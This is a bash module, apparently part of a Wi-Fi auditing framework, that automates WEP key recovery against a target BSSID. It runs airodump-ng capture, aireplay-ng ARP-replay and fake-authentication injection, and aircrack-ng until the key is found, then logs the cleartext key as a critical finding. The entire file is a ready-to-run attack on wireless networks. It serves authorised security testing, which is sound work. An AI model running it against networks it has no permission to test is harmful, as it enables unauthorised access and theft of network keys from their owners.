#!/usr/bin/env bash
# MODULE_META
# NAME="WEP Network Cracking [Past Attacks]"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="airodump-ng,aireplay-ng,aircrack-ng"
# DESC="Detect and crack legacy WEP networks via ARP replay and fragmentation"
# REQS="monitor_iface,target_bssid,target_channel"
# PCAP="yes"
# DECODE="wifi_mgmt"

#===============================================================================
#  modules/d2_wep_cracking.sh
#  D2: WEP Network Cracking (Golden Wrapper)
#===============================================================================

set -euo pipefail

# Inputs from Environment
INTERFACE="${MONITOR_INTERFACE:-}"
BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-}"
SCAN_TIME="${SCAN_TIME:-300}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D2"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_capture"
AIRODUMP_LOG="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
AIREPLAY_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
KEY_FILE="${EVIDENCE_DIR}/${TC_ID}_key.txt"

if [[ -z "$INTERFACE" || -z "$BSSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_BSSID not set."
    exit 1
fi

echo "[*] Starting WEP cracking attempt on ${BSSID} (Channel: ${CHANNEL:-auto})..."

# 1. Start Telemetry in Background
(
    ELAPSED=0
    while true; do
        PCT=$(( 10 + (ELAPSED % 85) ))
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Cracking WEP network..."
        sleep 5; ELAPSED=$((ELAPSED + 5))
    done
) &
TEL_PID=$!

# 2. Run Primary Tools
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Foreground execution
    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" &
    AIRO_PID=$!
    aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" &
    AIRE_PID=$!
    
    CAP_FILE="${OUTPUT_BASE}-01.cap"
    ELAPSED=0
    SUCCESS=0
    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
        sleep 30; ((ELAPSED+=30))
        if [[ -f "$CAP_FILE" ]]; then
            if aircrack-ng -b "$BSSID" "$CAP_FILE" 2>&1 | tee "$KEY_FILE" | grep -q "KEY FOUND"; then
                SUCCESS=1; break
            fi
        fi
        aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" || true
    done
    kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
    RET=$?
else
    # Background execution
    (
        airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$OUTPUT_BASE" --output-format pcap,csv "$INTERFACE" > "$AIRODUMP_LOG" 2>&1 &
        AIRO_PID=$!
        aireplay-ng --arpreplay -b "$BSSID" "$INTERFACE" > "$AIREPLAY_LOG" 2>&1 &
        AIRE_PID=$!
        
        CAP_FILE="${OUTPUT_BASE}-01.cap"
        ELAPSED=0
        SUCCESS=0
        while [[ $ELAPSED -lt $SCAN_TIME ]]; do
            sleep 30; ((ELAPSED+=30))
            if [[ -f "$CAP_FILE" ]]; then
                if aircrack-ng -b "$BSSID" "$CAP_FILE" > "$KEY_FILE" 2>&1 && grep -q "KEY FOUND" "$KEY_FILE"; then
                    SUCCESS=1; break
                fi
            fi
            aireplay-ng --fakeauth 10 -a "$BSSID" "$INTERFACE" > /dev/null 2>&1 || true
        done
        kill "$AIRO_PID" "$AIRE_PID" 2>/dev/null || true
    ) > /dev/null 2>&1 &
    TOOL_PID=$!
    wait $TOOL_PID; RET=$?
fi

# 3. Cleanup and Final Signal
kill $TEL_PID 2>/dev/null || true

# Reporting
SUCCESS=0
if [[ -f "$KEY_FILE" ]] && grep -q "KEY FOUND" "$KEY_FILE"; then
    SUCCESS=1
fi

if [[ $SUCCESS -eq 1 ]]; then
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WEP Key Recovered" \
        --severity CRITICAL \
        --desc "The cleartext WEP key was recovered for BSSID ${BSSID}." \
        --evidence "$KEY_FILE" \
        --rationale "WEP is cryptographically broken."
else
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[$TC_ID] Audit Complete" \
        --severity INFO \
        --desc "Attempted to recover WEP keys for ${BSSID}." \
        --evidence "${OUTPUT_BASE}-01.cap" \
        --rationale "WEP cracking depends on high traffic volume."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit $RET
